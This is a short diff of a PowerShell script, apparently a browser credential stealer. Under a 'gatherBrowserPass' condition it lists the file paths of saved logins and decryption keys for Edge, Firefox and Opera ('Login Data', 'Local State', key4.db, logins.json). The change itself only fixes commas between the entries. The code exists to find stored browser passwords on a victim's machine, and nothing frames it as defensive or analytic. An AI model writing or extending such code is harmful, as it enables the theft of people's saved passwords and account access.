@@ -156,14 +156,14 @@ if ($gatherBrowserPass) {
             LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
             LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
             Prefix = "Edge"
-        }
+        },
         @{
             ProcessName = "Firefox"
             $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
             LoginDataPath = "$FirefoxCredsLocation\key4.db"
             LocalStatePath = "$FirefoxCredsLocation\logins.json"
             Prefix = "Firefox"
-        }
+        },
         @{
             ProcessName = "Opera"
             $OperaCredsLocation = get-childitem -path "$env:appdata\Opera Software\Opera Stable\"
